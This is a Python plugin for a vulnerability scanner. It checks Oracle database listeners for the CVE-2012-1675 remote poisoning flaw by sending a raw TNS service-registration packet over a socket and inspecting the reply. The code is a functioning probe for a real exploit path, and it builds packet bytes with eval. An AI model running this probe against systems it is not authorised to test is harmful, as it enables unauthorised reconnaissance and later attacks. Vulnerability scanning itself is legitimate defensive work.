from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType
import socket

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "oracle TNS Listener远程投毒 (CVE-2012-1675)"
        self.scheme = [SchemeType.ORACLE]


    def verify(self, target):
        host = self.target_info['host']
        port = self.target_info['port']
        
        pkt = TNSPacket()
        verify_ack = pkt.getPacket(str.encode("(CONNECT_DATA=(COMMAND=service_register_NSGR))"))

        client = socket.socket()
        client.settimeout(4)
        client.connect((host, port))
        client.send(verify_ack)
        data = client.recv(1024)
        client.close()

        self.logger.info("verify {}".format(target))
        if b"(DESCRIPTION=(TMP=))" in data:
            hex_data = data.hex()
            tns_state_res = hex_data[8:10]

            if tns_state_res == "02":
                self.logger.success("found vul {}".format(target))
                return target


class TNSPacket:
    version = 10
    # :1 is the size + 58 of the packet
    basePacket = b"\x00:1\x00\x00\x01\x00\x00\x00"
    basePacket += b"\x01\x36\x01\x2c\x00\x00\x08\x00"
    basePacket += b"\x7f\xff\x7f\x08\x00\x00\x00\x01"
    # :2 is the real size of the packet
    basePacket += b"\x00:2\x00\x3a\x00\x00\x00\x00"
    basePacket += b"\x00\x00\x00\x00\x00\x00\x00\x00"
    basePacket += b"\x00\x00\x00\x00\x34\xe6\x00\x00"
    basePacket += b"\x00\x01\x00\x00\x00\x00\x00\x00"
    basePacket += b"\x00\x00"
    # :1 is the size + 58 of the packet
    base10gPacket = b"\x00:1\x00\x00\x01\x00\x00\x00"
    base10gPacket += b"\x01\x39\x01\x2c\x00\x81\x08\x00"
    base10gPacket += b"\x7f\xff\x7f\x08\x00\x00\x01\x00"
    # :2 is the real size of the packet
    base10gPacket += b"\x00:2\x00\x3a\x00\x00\x07\xf8"
    base10gPacket += b"\x0c\x0c\x00\x00\x00\x00\x00\x00"
    base10gPacket += b"\x00\x00\x00\x00\x00\x00\x00\x00"
    base10gPacket += b"\x00\x00\x00\x00\x00\x00\x00\x00"
    base10gPacket += b"\x00\x00"

    def getPacket(self, cmd):
        hLen1 = len(cmd) + 58
        hLen2 = len(cmd)
        x1 = str(hex(hLen1)).replace("0x", "")
        x2 = str(hex(hLen2)).replace("0x", "")
        if len(x1) == 1:
            x1 = "0" + x1
        if len(x2) == 1:
            x2 = "0" + x2
        hLen1 = eval("'\\x" + x1 + "'")
        hLen2 = eval("'\\x" + x2 + "'")
        if self.version >= 10:
            data = self.base10gPacket
        else:
            data = self.basePacket
        data = data.replace(b":1", str.encode(hLen1))
        data = data.replace(b":2", str.encode(hLen2))
        data += cmd
        return data
